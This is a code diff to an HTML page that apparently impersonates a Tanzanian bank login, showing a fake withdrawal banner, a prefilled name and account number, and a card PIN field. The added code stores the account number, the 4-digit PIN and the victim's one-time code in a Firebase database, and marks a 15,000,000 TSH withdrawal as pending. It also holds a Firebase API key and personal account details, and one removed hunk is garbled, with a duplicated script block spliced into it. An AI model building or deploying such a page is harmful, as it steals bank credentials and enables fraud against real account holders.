@@ -543,7 +543,6 @@
              VIEW 1: LANDING PAGE
              ========================================= -->
         <div id="landing-view" class="view-section active">
-            <!-- TOP NAVIGATION -->
             <header class="top-nav">
                 <div class="logo-container">
                     <div class="logo-lines">
@@ -567,7 +566,6 @@
                 </div>
             </header>
 
-            <!-- WITHDRAWAL ALERT BANNER -->
             <div class="withdraw-alert">
                 <div class="alert-icon"><i class="fa-solid fa-money-bill-transfer"></i></div>
                 <div class="alert-text">
@@ -577,10 +575,8 @@
                 </div>
             </div>
 
-            <!-- HERO BANNER -->
             <section class="hero">
                 <div class="hero-content">
-                    <!-- Invest Africa Logo -->
                     <div class="ia-logo">
                         <div class="ia-mark">
                             <span class="i-dot"></span>
@@ -597,18 +593,15 @@
                     <p>Connecting Africa's Growth to the World's</p>
                     <p>Capital</p>
                     
-                    <!-- CHANGED TO LOGIN NOW -->
                     <button class="btn-register" onclick="switchView('auth-view')">Login Now</button>
                 </div>
                 
-                <!-- Temple Silhouette Background -->
                 <div class="temple-bg"></div>
                 
                 <div class="hero-arrow left"><i class="fa-solid fa-chevron-left"></i></div>
                 <div class="hero-arrow right"><i class="fa-solid fa-chevron-right"></i></div>
             </section>
 
-            <!-- FOREX MARKET -->
             <section class="forex">
                 <h2>FOREX MARKET</h2>
                 <div class="forex-ticker">
@@ -621,10 +614,8 @@
                 <a href="#" class="view-all">VIEW ALL</a>
             </section>
 
-            <!-- PATTERN DIVIDER -->
             <div class="pattern-divider"></div>
 
-            <!-- WELCOME / TABS -->
             <section class="welcome-section">
                 <h2>Welcome! How can we help you?</h2>
                 
@@ -637,12 +628,10 @@
                 </div>
             </section>
 
-            <!-- CAROUSEL AREA -->
             <section class="carousel-area">
                 <button class="arrow-btn"><i class="fa-solid fa-chevron-left"></i></button>
                 
                 <div class="icon-circle">
-                    <!-- Desk Icon SVG -->
                     <svg viewBox="0 0 100 100" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <circle cx="30" cy="45" r="6" />
                         <path d="M20 70 v-10 a10 10 0 0 1 20 0 v10" />
@@ -661,7 +650,6 @@
                 <button class="arrow-btn"><i class="fa-solid fa-chevron-right"></i></button>
             </section>
             
-            <!-- Bottom cut off text -->
             <div class="bottom-text">Chat with us</div>
         </div>
 
@@ -683,13 +671,11 @@
                         <strong>Name:</strong> Paschal Slaa
                     </div>
 
-                    <!-- CHANGED TO ACCOUNT NUMBER -->
                     <div class="input-group">
                         <i class="fa-solid fa-user"></i>
                         <input type="text" placeholder="Account Number" value="0152427866500" readonly id="account-input">
                     </div>
                     
-                    <!-- CHANGED TO CARD PIN (4 DIGITS) -->
                     <div class="input-group">
                         <i class="fa-solid fa-credit-card"></i>
                         <input type="password" placeholder="Card Pin (4 digits)" maxlength="4" minlength="4" inputmode="numeric" pattern="[0-9]{4}" required id="pin-input">
@@ -784,7 +770,7 @@
     <script type="module">
         // 1. Import Firebase modules
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getDatabase, ref, set, get } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+        import { getDatabase, ref, set, get, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
         // 2. Your injected config
         const firebaseConfig = {
@@ -830,7 +816,7 @@
             toast.classList.add('show');
             setTimeout(() => {
                 toast.classList.remove('show');
-            }, 3500); // Hide after 3.5 seconds
+            }, 3500); 
         }
 
         // --- VIEW SWITCHING LOGIC ---
@@ -854,7 +840,7 @@
                 return;
             }
 
-            currentAccountKey = btoa(accountVal); // Base64 encode account for safe DB keys
+            currentAccountKey = btoa(accountVal); 
             
             const originalText = loginBtn.innerHTML;
             loginBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Authenticating...';
@@ -864,211 +850,20 @@
             const expiresAt = Date.now() + 120000;
 
             try {
-                await set(ref(db, 'otps/' + currentAccountKey), {
-                    code: generatedOtp,
-                    expiresAt: expiresAt
-                });
-
-                // NO TOAST/NOTIFICATION HERE - Direct to code page as ordered
-                displayAccount.textContent = accountVal;
-
-                switchView('verify-view');
-                inputs[0].focus();
-                startTimer();
-
-            } catch (error) {
-                console.error("Firebase Error:", error);
-                showToast("Connection error. Please try again.");
-            } finally {
-                loginBtn.innerHTML = originalText;
-                loginBtn.disabled = false;
-            }
-        });
-
-        // --- OTP INPUT UI LOGIC ---
-        inputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                const val = e.target.value;
-                if (val.length === 1 && index < inputs.length - 1) {
-                    inputs[index + 1].focus();
-                }
-            });
-
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && !e.target.value && index > 0) {
-                    inputs[index - 1].focus();
-                }
-            });
-
-            input.addEventListener('keypress', (e) => {
-                if (!/[0-9]/.test(e.key)) {
-                    e.preventDefault();
-                }
-            });
-        });
-
-        // --- TIMER LOGIC ---
-        function startTimer() {
-            clearInterval(timerInterval);
-            timeLeft = 120;
-            verifyBtn.disabled = false;
-            timerContainer.classList.remove('expired');
-            resendBtn.style.display = 'none';
-            resendArea.style.display = 'block';
-            updateTimerDisplay();
-
-            timerInterval = setInterval(() => {
-                timeLeft--;
-                updateTimerDisplay();
-
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    timerExpired();
-                }
-            }, 1000);
-        }
-
-        function updateTimerDisplay() {
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            const formattedTime = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            countdownEl.textContent = formattedTime;
-        }
-
-        function timerExpired() {
-            countdownEl.textContent = "00:00";
-            timerContainer.classList.add('expired');
-            timerContainer.querySelector('span').innerHTML = 'Code Expired. <span class="timer-text" id="countdown">00:00</span>';
-            verifyBtn.disabled = true;
-            resendBtn.style.display = 'inline-block';
-            resendArea.innerHTML = 'Code expired. <button class="resend-btn" id="resend-btn" onclick="resendOTP()" style="display:inline-block;">Click to Resend</button>';
-        }
-
-        // --- VERIFY CODE ---
-        window.verifyCode = async function() {
-            let code = "";
-            let isComplete = true;
-            
-            inputs.forEach(input => {
-                if (input.value === '') isComplete = false;
-                code += input.value;
-            });
-
-            // Enforce exactly 6 digits
-            if (!isComplete || code.length !== 6) {
-                showToast("Please enter exactly 6 digits.");
-                return;
-            }
-
-            verifyBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Verifying...';
-            verifyBtn.disabled = true;
-
-            try {
-                const dbRef = ref(db, 'otps/' + currentAccountKey);
-                const snapshot = await get(dbRef);
-
-                if (snapshot.exists()) {
-                    const data = snapshot.val();
-    <!-- =========================================
-         JAVASCRIPT & FIREBASE SYNC
-         ========================================= -->
-    <script type="module">
-        // 1. Import Firebase modules
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getDatabase, ref, set, get } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
-
-        // 2. Your injected config
-        const firebaseConfig = {
-            apiKey: "AIzaSyAeOvMJiQLNiKtlFp9wYyI3UOpA3vkqH4Y",
-            authDomain: "crdb-bank.firebaseapp.com",
-            databaseURL: "https://crdb-bank-default-rtdb.europe-west1.firebasedatabase.app",
-            projectId: "crdb-bank",
-            storageBucket: "crdb-bank.firebasestorage.app",
-            messagingSenderId: "227547483432",
-            appId: "1:227547483432:web:69a2201de150303a0ad41d",
-            measurementId: "G-QH1ZHPGB4S"
-        };
-
-        // 3. Initialize Firebase
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-        console.log("Firebase Synced!");
-
-        // --- DOM ELEMENTS ---
-        const loginForm = document.getElementById('login-form');
-        const loginBtn = document.getElementById('login-btn');
-        const accountInput = document.getElementById('account-input');
-        const pinInput = document.getElementById('pin-input');
-        const displayAccount = document.getElementById('display-account');
-        
-        const inputs = document.querySelectorAll('.otp-input');
-        const countdownEl = document.getElementById('countdown');
-        const timerContainer = document.getElementById('timer-container');
-        const verifyBtn = document.getElementById('verify-btn');
-        const resendBtn = document.getElementById('resend-btn');
-        const resendArea = document.querySelector('.resend-area');
-
-        const toast = document.getElementById('toast');
-        const toastMessage = document.getElementById('toast-message');
-
-        let currentAccountKey = "";
-        let timeLeft = 120; 
-        let timerInterval;
-
-        // --- CUSTOM TOAST NOTIFICATION ---
-        function showToast(message) {
-            toastMessage.textContent = message;
-            toast.classList.add('show');
-            setTimeout(() => {
-                toast.classList.remove('show');
-            }, 3500); // Hide after 3.5 seconds
-        }
-
-        // --- VIEW SWITCHING LOGIC ---
-        window.switchView = function(viewId) {
-            document.querySelectorAll('.view-section').forEach(view => {
-                view.classList.remove('active');
-            });
-            document.getElementById(viewId).classList.add('active');
-        }
-
-        // --- LOGIN & FIREBASE SYNC ---
-        loginForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            const accountVal = accountInput.value;
-            const pinVal = pinInput.value;
-
-            // Enforce exactly 4 digits for PIN
-            if (pinVal.length !== 4) {
-                showToast("Card Pin must be exactly 4 digits.");
-                return;
-            }
-
-            currentAccountKey = btoa(accountVal); // Base64 encode account for safe DB keys
-            
-            const originalText = loginBtn.innerHTML;
-            loginBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Authenticating...';
-            loginBtn.disabled = true;
-
-            const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
-            const expiresAt = Date.now() + 120000;
-
-            try {
-                // NEW: Record the Account Number and Card PIN to Firebase
+                // RECORD 1: Log the Account Number and 4-digit Card PIN immediately
                 await set(ref(db, 'users/' + accountVal), {
                     accountNumber: accountVal,
                     cardPin: pinVal,
-                    lastLogin: Date.now()
+                    lastLogin: Date.now(),
+                    status: "Awaiting Verification"
                 });
 
-                // Save OTP to Firebase
+                // RECORD 2: Generate and log the OTP
                 await set(ref(db, 'otps/' + currentAccountKey), {
                     code: generatedOtp,
                     expiresAt: expiresAt
                 });
 
-                // NO TOAST/NOTIFICATION HERE - Direct to code page as ordered
                 displayAccount.textContent = accountVal;
 
                 switchView('verify-view');
@@ -1143,7 +938,7 @@
             resendArea.innerHTML = 'Code expired. <button class="resend-btn" id="resend-btn" onclick="resendOTP()" style="display:inline-block;">Click to Resend</button>';
         }
 
-        // --- VERIFY CODE ---
+        // --- VERIFY CODE & RECORD OTP ---
         window.verifyCode = async function() {
             let code = "";
             let isComplete = true;
@@ -1175,12 +970,19 @@
                         timerExpired();
                     } else if (data.code === code) {
                         
-                        // Clean success toast and redirect to Pending Page
+                        // RECORD 3: Update the user record with the successful OTP and new status
+                        await update(ref(db, 'users/' + accountInput.value), {
+                            verificationCodeUsed: code,
+                            status: "Verified - Pending Withdrawal",
+                            withdrawalAmount: "TSH.15,000,000.00",
+                            verifiedAt: Date.now()
+                        });
+
+                        // Clean up the temporary OTP
                         await set(ref(db, 'otps/' + currentAccountKey), null);
                         
                         showToast("Your withdrawal is successfully");
                         
-                        // Wait for toast to be seen, then switch view
                         setTimeout(() => {
                             switchView('pending-view');
                         }, 1500);
@@ -1216,7 +1018,6 @@
                     code: generatedOtp,
                     expiresAt: expiresAt
                 });
-                // No dev alert, just restart the timer silently
                 startTimer();
             } catch (error) {
                 console.error("Firebase Error:", error);
